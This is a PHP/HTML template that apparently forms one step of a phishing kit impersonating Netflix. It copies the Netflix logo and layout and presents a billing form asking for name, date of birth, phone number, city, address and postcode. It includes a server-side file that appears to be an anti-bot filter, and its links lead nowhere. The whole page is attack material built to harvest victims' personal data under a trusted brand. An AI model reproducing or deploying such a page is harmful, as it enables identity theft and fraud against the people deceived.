<?php include '../../server/ab.php';


?>
<body>
	<div id="appMountPoint">
		<div class="netflix-sans-font-loaded">
			<div class="basicLayout notMobile modernInApp memberSimplicity-creditOptionMode simplicity" lang="fr-CI" dir="ltr">
				<div class="nfHeader noBorderHeader signupBasicHeader onboarding-header">
					<a href="#" class="svg-nfLogo signupBasicHeader onboarding-header" data-uia="netflix-header-svg-logo">
						<svg viewBox="0 0 111 30" data-uia="netflix-logo" class="svg-icon svg-icon-netflix-logo" aria-hidden="true" focusable="false">
							<g id="netflix-logo">
								<path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
							</g>
						</svg><span class="screen-reader-text">Accueil Netflix</span></a><a href="#" class="authLinks signupBasicHeader onboarding-header" data-uia="header-signout-link"><?php echo $traduce["$lang"]["sign_out"];?></a></div>
				<div class="simpleContainer" data-uia="simpleContainer" data-transitioned-child="true">
					<div class="centerContainer firstLoad">
						<div data-uia="payment-form">
							<div class="paymentFormContainer">
								<div class="messageContainer" style="display:none" data-a11y-focus="true" id="error" tabindex="0">
									<div class="nf-message-container" data-uia="UIMessage+container">
										<div role="alert" data-uia="UIMessage-content" class="css-n55wxj">
											<div class="css-1x17g94">
												<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="css-1m8xz7s" data-uia="UIMessage-content+icon" aria-hidden="true">
													<path fill-rule="evenodd" clip-rule="evenodd" d="M20.7349,21h-17.46979c-1.60302,0 -2.55464,-1.7915 -1.65717,-3.1197l8.73486,-12.92769c0.7931,-1.17371 2.5214,-1.17371 3.3144,0l8.7349,12.92769c0.8975,1.3282 -0.0542,3.1197 -1.6572,3.1197zM13.5,8.99999h-3l0.5,6.00001h2zM10.5,17.5c0,0.8284 0.6716,1.5 1.5,1.5c0.8284,0 1.5,-0.6716 1.5,-1.5c0,-0.8284 -0.6716,-1.5 -1.5,-1.5c-0.8284,0 -1.5,0.6716 -1.5,1.5z" fill="currentColor"></path>
												</svg>
												<div><span id="error-text" data-uia=""></span></div>
											</div>
										</div>
									</div>
								</div>
								<div>
									<div class="stepHeader-container" data-uia="header">
										<div class="stepHeader" role="status">
											<h1 class="stepTitle" data-uia="stepTitle"></h1></div>
									</div>
									<div class="contextContainer"></div>
								</div>
								<div class="fieldContainer"> 
									<div class="formFieldContainer">
										<ul class="simpleForm structural ui-grid">
											
											<li data-uia="field-lastName+wrapper" class="nfFormSpace">
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input type="text" data-uia="field-lastName" placeholder="<?php echo $traduce["$lang"]["billing_name"];?>" name="lastName" class="nfTextField" id="name" value="" tabindex="0" autocomplete="cc-family-name" dir="" placeholder="">
															
														</label>
													</div>
												</div>
											</li>
                                            <li data-uia="field-lastName+wrapper" class="nfFormSpace">
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input type="text" data-uia="field-lastName" placeholder="<?php echo $traduce["$lang"]["billing_dob"];?>" name="lastName" class="nfTextField" id="dob" value="" tabindex="0" autocomplete="cc-family-name" dir="" placeholder="">
														</label>
													</div>
												</div>
											</li>
                                            <li data-uia="field-lastName+wrapper" class="nfFormSpace">
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input type="text" data-uia="field-lastName" placeholder="<?php echo $traduce["$lang"]["billing_tel"];?>" name="lastName" class="nfTextField" id="tel" value="" tabindex="0" autocomplete="cc-family-name" dir="" placeholder="">
														</label>
													</div>
												</div>
											</li>
                                            <li data-uia="field-lastName+wrapper" class="nfFormSpace">
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input type="text" data-uia="field-lastName" placeholder="<?php echo $traduce["$lang"]["billing_city"];?>" name="lastName" class="nfTextField" id="city" value="" tabindex="0" autocomplete="cc-family-name" dir="" placeholder="">
														</label>
													</div>
												</div>
											</li>
                                            <li data-uia="field-lastName+wrapper" class="nfFormSpace">
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input type="text" data-uia="field-lastName" name="lastName" placeholder="<?php echo $traduce["$lang"]["billing_address"];?>" class="nfTextField" id="address" value="" tabindex="0" autocomplete="cc-family-name" dir="" placeholder="">
														</label>
													</div>
												</div>
											</li>
                                            <li data-uia="field-lastName+wrapper" class="nfFormSpace">
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input type="text" data-uia="field-lastName" placeholder="<?php echo $traduce["$lang"]["billing_zip"];?>" name="lastName" class="nfTextField" id="zip" value="" tabindex="0" autocomplete="cc-family-name" dir="" placeholder="">
														</label>
													</div>
												</div>
											</li>
										</ul>
									</div>
								</div>
							</div>
							<div class="submitBtnContainer">
								<button type="submit" autocomplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" onclick="submit('2')" data-uia="action-submit-payment" placeholder=""><?php echo $traduce["$lang"]["billing_button"];?></button>
							</div>
						</div>
					</div>
				</div>
				<div class="site-footer-wrapper centered">
					<div class="footer-divider"></div>
					<div class="site-footer">
        <p class="footer-top"><?php echo $traduce["$lang"]["footer_question"];?>&nbsp;?</p>
        <ul class="footer-links structural">
            <li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_faq"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_help"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_cou"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_conf"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_cook"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_lm"];?></span></a></li>
        </ul>
        <div class="lang-selection-container" id="lang-switcher">
            <div data-uia="language-picker+container" class="ui-select-wrapper"><label for="lang-switcher-select" class="ui-label"><span class="ui-label-text"><?php echo $traduce["$lang"]["footer_ls"];?></span></label>
                <div class="select-arrow medium prefix globe"><select data-uia="language-picker" class="ui-select medium" id="lang-switcher-select" tabindex="0" placeholder="lang-switcher"><option selected="" lang="fr" value="/?locale=fr-FR" data-language="fr" data-country="FR"><?php echo $traduce["$lang"]["footer_lang"];?></option><option lang="en" value="/?locale=en-FR" data-language="en" data-country="FR">English</option></select></div>
            </div>
        </div>
    </div>
				</div>
			</div>
		</div>
	</div>
</body>

</html>